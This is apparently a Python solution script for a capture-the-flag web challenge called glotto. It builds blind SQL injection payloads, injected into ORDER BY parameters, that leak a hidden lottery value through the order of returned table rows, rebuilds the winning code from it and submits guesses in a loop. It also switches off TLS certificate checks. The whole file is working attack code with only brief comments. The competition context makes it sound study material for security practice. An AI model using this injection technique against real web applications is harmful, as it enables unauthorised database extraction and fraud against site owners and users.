#!/usr/bin/python3.7

import binascii
import re
import requests
import random
import functools
import math

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def hexa(string):
    """Converts a string into its 0x41424344 MySQL representation.
    """
    return '0x' + binascii.hexlify(string.encode()).decode()


def date_to_index(values):
    """Converts a date into a numerical index.
    """
    values = ','.join(values)
    values = hexa(values)
    return f"FIND_IN_SET(MID(date,9),{values})-1"


def inner_query(nb_candidates, base_divisor):
    """Builds the inner query which sets up remainders, r{i}.
    """
    modulo = math.factorial(nb_candidates)
    base = 'CONV(@lotto,36,10)'
    base = f'(({base} DIV {base_divisor})%{modulo})'

    divisor = 1
    fields = []
    for i in range(nb_candidates, 1, -1):
        field = f'(({base} DIV {divisor}) % {i}) r{i}'
        fields.append(field)
        divisor *= i

    fields = ','.join(fields)
    return f'SELECT {fields}'


def middle_query(nb_candidates, divisor):
    """Builds the middle query which converts remainders r{i} into indices i{i}.
    """
    fields = []
    potential_values = hexa(''.join(map(str, range(nb_candidates))))
    fields.append(f'@s{nb_candidates+1}:={potential_values}')

    for i in range(nb_candidates, 1, -1):
        fields.append(f'MID(@s{i+1},r{i}+1,1) i{i}')
        fields.append(f'@s{i}:=CONCAT(MID(@s{i+1},1,r{i}),MID(@s{i+1},r{i}+2))')

    fields = ','.join(fields)
    inner = inner_query(nb_candidates, divisor)
    return f'SELECT {fields} FROM ({inner})a'


def outer_query(nb_candidates, divisor):
    """Builds the outer query, a string consisting of nb_candidates-1 zeros and
    a single one, indicating which row must be at which position.
    """
    outer_fields = ','.join(f'@x=i{i}' for i in range(nb_candidates, 1, -1))
    outer_fields = f'CONCAT({outer_fields})'

    middle = middle_query(nb_candidates, divisor)
    return f'SELECT {outer_fields} FROM ({middle})b'


def full_query(candidates, divisor):
    """Builds the full ORDER BY statement by setting up @x and building the 3
    other queries.
    """
    x = date_to_index(candidates)
    outer = outer_query(len(candidates), divisor)
    return f'(SELECT @x:=({x}))&0 | ({outer})'


def extract_days(r, month):
    """Given an HTTP response r and a month, extracts the date rows in order.
    """
    # The challenge is a bit broken: for instance, June has a ticket for March,
    # 1rst. Luckily the days are distinct for all rows, so it works out in the
    # end.
    m = re.search(
        f'{month}</div>.*?<table class="table">(.*?)</table>',
        r.text,
        flags=re.S
    )
    return re.findall(r'<td>2019-\d{2}-(\d{2})</td>', m.group(1))


def days_to_indices(base, obtained):
    """Converts the days into their indices.
    """
    return [base.index(day) for day in obtained]


def get_months_days(response):
    """Extract the days available for each month.
    For march, you'd get 01,03,05,10,13,18,23,28,30.
    """
    return [
        extract_days(response, month)
        for month in ('march', 'april', 'may', 'june')
    ]


def rebuild_integer(base, obtained):
    """Rebuilds the expected integer by first converting the date indices into
    remainders, and then reconstructing the number from these remainders.
    """

    indices = days_to_indices(base, obtained)
    indices = indices[::-1]
    nb_days = len(base)

    bases = [i for i in range(nb_days)]
    remainders = []

    for i in indices[:-1]:
        r = bases.index(i)
        remainders.append(r)
        bases.pop(r)

    #print("::",indices)
    #print(">>",remainders)

    n = 0

    for i, r in enumerate(remainders[::-1]):
        n = (i + 2) * n + r

    return n


def rebuild_code(N):
    """Converts a number N from base 10 to base 36.
    """
    charset = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    base = len(charset)
    code = ''

    while N > 1:
        code += charset[N % base]
        N //= base

    return code[::-1]

def run():
    queries = []    
    divisor = 1

    # Build a query for each table
    for days in base_months_days:
        query = full_query(days, divisor)
        divisor *= math.factorial(len(days))
        queries.append(query)

    # Inject the 4 fields ...
    response = session.get(
        URL,
        params={
            f'order{i}': f'winner`&0,{query} -- -'
            for i, query in enumerate(queries)
        }
    )
    # ... and get the ordered dates in the page
    ordered_months_days = get_months_days(response)

    # Rebuild integers from the date numbers

    integers = [
        rebuild_integer(base_days, month_days)
        for base_days, month_days in zip(base_months_days, ordered_months_days)
    ]

    # Rebuild final number

    N = 0
    for bmd, r in list(zip(base_months_days, integers))[::-1]:
        N = N * math.factorial(len(bmd)) + r

    # We're missing bits, we need to guess them:

    f = math.factorial
    order = functools.reduce(
        (lambda x, y: x * y), (
            f(len(days)) for days in base_months_days
        )
    )

    # 1234 is D[june]: it's a one in 2678 guess
    N_guess = N + 1234 * order
    code = rebuild_code(N_guess)

    print(f'Guessing {code}...')

    r = session.post(URL, data={'code': code})
    
    if 'You won!' in r.text:
        print(r.text)
        exit()
    
    # The page is kind enough to return the winning ticket, so we can verify if
    # we didn't fuck up any computation
    
    expected_ticket_v = re.search('winning ticket was (.*)', r.text).group(1)
    expected_ticket = int(expected_ticket_v, 36)
    expected_compute = expected_ticket % order
    if expected_compute != N:
        print(
            "::", expected_ticket_v, expected_ticket,
            expected_compute, N, N-expected_compute
        )


# Exploit prelude: setup HTTP and get the days for each month table.

URL = 'https://glotto.web.ctfcompetition.com'
session = requests.Session()
session.verify = False
#session.proxies = {'https': 'localhost:8080'}

response = session.get(URL)
base_months_days = get_months_days(response)


# Exploit: find out @lotto and get lucky
# We need to run it several times :)
while True:
    run()